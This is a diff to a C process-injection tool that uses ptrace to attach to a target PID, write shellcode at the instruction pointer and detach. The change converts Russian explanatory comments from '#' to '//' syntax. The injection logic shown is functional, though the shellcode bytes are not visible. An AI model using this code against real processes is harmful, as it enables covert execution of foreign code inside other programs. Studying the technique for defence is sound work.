@@ -37,13 +37,13 @@ unsigned char *shellcode =
 
 
 int
-inject_data (pid_t pid, unsigned char *src, void *dst, int len) #выполняет инъекцию данных (шелл-кода) в адресное пространство целевого процесса.
+inject_data (pid_t pid, unsigned char *src, void *dst, int len) //выполняет инъекцию данных (шелл-кода) в адресное пространство целевого процесса.
 {
   int      i;
   uint32_t *s = (uint32_t *) src;
   uint32_t *d = (uint32_t *) dst;
 
-  for (i = 0; i < len; i+=4, s++, d++) #Исполняет поблочную запись данных в процесс через PTRACE_POKETEXT, что позволяет изменять память другого процесса
+  for (i = 0; i < len; i+=4, s++, d++) //Исполняет поблочную запись данных в процесс через PTRACE_POKETEXT, что позволяет изменять память другого процесса
     {
       if ((ptrace (PTRACE_POKETEXT, pid, d, *s)) < 0)
 	{
@@ -70,7 +70,7 @@ main (int argc, char *argv[])
   target = atoi (argv[1]);
   printf ("+ Tracing process %d\n", target);
 
-  if ((ptrace (PTRACE_ATTACH, target, NULL, NULL)) < 0) #Присоединение к целевому процессу для контроля.
+  if ((ptrace (PTRACE_ATTACH, target, NULL, NULL)) < 0) //Присоединение к целевому процессу для контроля.
     {
       perror ("ptrace(ATTACH):");
       exit (1);
@@ -80,7 +80,7 @@ main (int argc, char *argv[])
   wait (NULL);
 
   printf ("+ Getting Registers\n");
-  if ((ptrace (PTRACE_GETREGS, target, NULL, &regs)) < 0) #Извлекает регистры процесса для получения текущего значения RIP (инструкционного указателя).
+  if ((ptrace (PTRACE_GETREGS, target, NULL, &regs)) < 0) //Извлекает регистры процесса для получения текущего значения RIP (инструкционного указателя).
     {
       perror ("ptrace(GETREGS):");
       exit (1);
@@ -90,7 +90,7 @@ main (int argc, char *argv[])
   /* Inject code into current RPI position */
 
   printf ("+ Injecting shell code at %p\n", (void*)regs.rip);
-  inject_data (target, shellcode, (void*)regs.rip, SHELLCODE_SIZE); #Вставляет шелл-код в текущую позицию RIP.
+  inject_data (target, shellcode, (void*)regs.rip, SHELLCODE_SIZE); //Вставляет шелл-код в текущую позицию RIP.
 
   regs.rip += 2;
   printf ("+ Setting instruction pointer to %p\n", (void*)regs.rip);
@@ -103,7 +103,7 @@ main (int argc, char *argv[])
   printf ("+ Run it!\n");
 
  
-  if ((ptrace (PTRACE_DETACH, target, NULL, NULL)) < 0) #Отсоединяется от процесса, позволяя ему продолжать выполнение.
+  if ((ptrace (PTRACE_DETACH, target, NULL, NULL)) < 0) //Отсоединяется от процесса, позволяя ему продолжать выполнение.
 	{
 	  perror ("ptrace(DETACH):");
 	  exit (1);
